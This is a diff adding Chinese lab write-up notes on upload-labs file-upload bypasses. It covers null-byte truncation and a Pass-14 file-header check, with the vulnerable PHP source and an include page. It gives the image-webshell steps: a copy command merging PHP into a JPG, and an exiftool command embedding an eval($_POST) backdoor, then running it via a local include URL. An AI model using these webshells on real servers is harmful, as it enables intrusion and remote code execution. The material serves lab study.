@@ -552,5 +552,101 @@ Deny from all
 1. GET传值在网址处可以看得到，用%00截断  
 2. POST传值在网址处不可以看到，用0x00截断
 
+%00与0x00截断的区别：  
+原理一样，只是在Pass-12中为GET方式，服务器在进行URL解码时将其解码成0x00,Pass-13中为POST方式，没有URL解码这一步骤，所以要在hex值中修改，形成0x00截断。
+
+
+##Pass-14
+
+漏洞点为服务端--检查内容--文件头检查
+
+源码
+
+	function getReailFileType($filename){
+	    $file = fopen($filename, "rb");
+	    $bin = fread($file, 2); //只读2字节
+	    fclose($file);
+	    $strInfo = @unpack("C2chars", $bin);    
+	    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
+	    $fileType = '';    
+	    switch($typeCode){      
+	        case 255216:            
+	            $fileType = 'jpg';
+	            break;
+	        case 13780:            
+	            $fileType = 'png';
+	            break;        
+	        case 7173:            
+	            $fileType = 'gif';
+	            break;
+	        default:            
+	            $fileType = 'unknown';
+	        }    
+	        return $fileType;
+	}
+	
+	$is_upload = false;
+	$msg = null;
+	if(isset($_POST['submit'])){
+	    $temp_file = $_FILES['upload_file']['tmp_name'];
+	    $file_type = getReailFileType($temp_file);
+	
+	    if($file_type == 'unknown'){
+	        $msg = "文件未知，上传失败！";
+	    }else{
+	        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
+	        if(move_uploaded_file($temp_file,$img_path)){
+	            $is_upload = true;
+	        } else {
+	            $msg = "上传出错！";
+	        }
+	    }
+	}
+
+文件包含页面源码
+
+	 <?php
+	/*
+	本页面存在文件包含漏洞，用于测试图片马是否能正常运行！
+	*/
+	header("Content-Type:text/html;charset=utf-8");
+	$file = $_GET['file'];
+	if(isset($file)){
+	    include $file;
+	}else{
+	    show_source(__file__);
+	}
+	?> 
+
+漏洞原理：  
+>1. 检测上传文件只检测前两个字节，导致木马文件可能藏在后面  
+>2. php中的include()会把文件当做php文件来执行
+
+容易导致文件包含的函数：
+
+	
+	include()  
+	require()  
+	inlcude_once()  
+	require_once()
+
+
+利用方式：通过上传包含木马内容的图片文件，从而绕过上传检测，然后利用include.php把图片文件当做php文件来执行。
+
+制作图片马cmd下运行copy 1.jpg /b 2.php /a 3.jpg，上传绕过检测，然后构造payroad：http://127.0.0.1:8080/include.php?file=upload/3.jpg
+
+**补充**
+
+制作图片马时可以把木马放在图片的comment中，用exiftool工具
+
+	exiftool "-comment=<?php echo 'hello world';eval($_POST['a']); ?>" 4.jpg
+结果如下
+
+<img src="https://raw.githubusercontent.com/picgouser/pic/master/20200317023138.png" width="60%">
+
+<img src="https://raw.githubusercontent.com/picgouser/pic/master/20200317023346.png" width="60%">
+
+
+
 
 
